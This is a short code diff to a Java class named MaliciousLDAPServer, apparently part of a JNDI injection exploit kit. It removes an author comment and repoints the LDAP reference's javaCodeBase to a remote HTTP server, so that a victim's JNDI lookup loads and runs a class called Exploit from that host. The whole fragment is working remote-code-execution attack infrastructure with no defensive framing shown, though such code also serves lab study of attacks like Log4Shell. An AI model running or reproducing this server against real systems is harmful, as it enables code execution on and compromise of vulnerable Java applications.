@@ -18,9 +18,6 @@ import com.unboundid.ldap.sdk.ResultCode;
 
 /**
  * LDAP server implementation returning JNDI references
- * 
- * @author mbechler
- *
  */
 public class MaliciousLDAPServer {
 
@@ -79,7 +76,7 @@ public class MaliciousLDAPServer {
                 System.out.println("Send LDAP reference result for " + base + " with java object entry at " + codebase.toString());
     
                 e.addAttribute("javaClassName", "foo");                       // entry is a Java Class, with name Exploit
-                e.addAttribute("javaCodeBase", "http://localhost:8000/");                    // java code is hosted at http://http_server_ip:web_port/Exploit.class
+                e.addAttribute("javaCodeBase", "http://snoopy-http-server:8000/");                    // java code is hosted at http://http_server_ip:web_port/Exploit.class
                 e.addAttribute("objectClass", "javaNamingReference");                      
                 e.addAttribute("javaFactory", "Exploit");                     // name of malicious class : Exploit
                 result.sendSearchEntry(e);
